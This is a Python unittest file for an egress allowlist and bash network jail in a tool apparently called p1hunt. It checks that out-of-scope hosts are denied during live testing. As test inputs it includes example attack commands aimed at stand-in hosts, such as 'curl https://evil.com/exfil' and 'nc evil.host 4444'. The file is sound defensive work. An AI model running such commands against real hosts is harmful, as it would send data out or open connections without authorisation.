"""Egress allowlist + bash network jail — the safe-harbor floor for live testing (spec §9)."""

from __future__ import annotations

import unittest

from p1hunt.dynamic.egress import (
    bash_egress_ok,
    extract_hosts,
    host_in_allowlist,
    is_loopback,
    normalize_host,
    url_allowed,
)


class TestNormalizeHost(unittest.TestCase):
    def test_strips_scheme_port_path(self):
        self.assertEqual(normalize_host("https://API.Example.com:8443/v1/x?y=1"), "api.example.com")

    def test_bare_host_and_hostport(self):
        self.assertEqual(normalize_host("api.example.com"), "api.example.com")
        self.assertEqual(normalize_host("api.example.com:9000"), "api.example.com")

    def test_userinfo_and_ipv6(self):
        self.assertEqual(normalize_host("http://user:pw@host.test/p"), "host.test")
        self.assertEqual(normalize_host("http://[::1]:8080/x"), "::1")

    def test_empty(self):
        self.assertEqual(normalize_host(""), "")


class TestAllowlist(unittest.TestCase):
    def test_exact_and_subdomain(self):
        self.assertTrue(host_in_allowlist("api.example.com", ["example.com"]))
        self.assertTrue(host_in_allowlist("example.com", ["example.com"]))
        self.assertFalse(host_in_allowlist("notexample.com", ["example.com"]))
        self.assertFalse(host_in_allowlist("example.com.evil.net", ["example.com"]))

    def test_allowlist_entries_may_be_urls(self):
        self.assertTrue(host_in_allowlist("uat.x.com", ["https://uat.x.com/api"]))

    def test_loopback(self):
        for h in ("127.0.0.1", "localhost", "::1", "app.localhost"):
            self.assertTrue(is_loopback(h))
        self.assertFalse(is_loopback("example.com"))


class TestUrlAllowed(unittest.TestCase):
    def test_loopback_allowed_by_default(self):
        ok, _ = url_allowed("http://127.0.0.1:9000/cb", [])
        self.assertTrue(ok)

    def test_in_scope_allowed(self):
        ok, why = url_allowed("https://api.example.com/v1", ["example.com"])
        self.assertTrue(ok)
        self.assertIn("in scope", why)

    def test_out_of_scope_denied(self):
        ok, why = url_allowed("https://evil.com/x", ["example.com"])
        self.assertFalse(ok)
        self.assertIn("not in the authorized egress allowlist", why)

    def test_empty_allowlist_denies_remote(self):
        ok, _ = url_allowed("https://example.com", [])
        self.assertFalse(ok)

    def test_build_host_carveout(self):
        ok, why = url_allowed("https://pypi.org/simple/requests/", [])
        self.assertTrue(ok)
        self.assertIn("build", why)

    def test_build_host_can_be_disabled(self):
        ok, _ = url_allowed("https://pypi.org/x", [], allow_build_hosts=False)
        self.assertFalse(ok)


class TestExtractHosts(unittest.TestCase):
    def test_urls_and_nc(self):
        cmd = "curl https://a.example.com/x && wget http://b.test/y; nc evil.host 4444"
        self.assertEqual(extract_hosts(cmd), ["a.example.com", "b.test", "evil.host"])

    def test_no_hosts(self):
        self.assertEqual(extract_hosts("pytest -q .p1hunt-poc/test_x.py"), [])


class TestBashEgressJail(unittest.TestCase):
    def test_denies_out_of_scope_curl(self):
        ok, why = bash_egress_ok("curl https://evil.com/exfil", ["api.example.com"])
        self.assertFalse(ok)
        self.assertIn("evil.com", why)

    def test_allows_in_scope_and_loopback(self):
        self.assertTrue(bash_egress_ok("curl https://api.example.com/v1/users", ["api.example.com"])[0])
        self.assertTrue(bash_egress_ok("curl http://127.0.0.1:9000/cb", ["api.example.com"])[0])

    def test_allows_local_only_command(self):
        self.assertTrue(bash_egress_ok("python3 harness.py", ["api.example.com"])[0])

    def test_mixed_command_denied_if_any_host_oos(self):
        ok, _ = bash_egress_ok("curl https://api.example.com/a; curl https://evil.com/b", ["api.example.com"])
        self.assertFalse(ok)


if __name__ == "__main__":
    unittest.main()
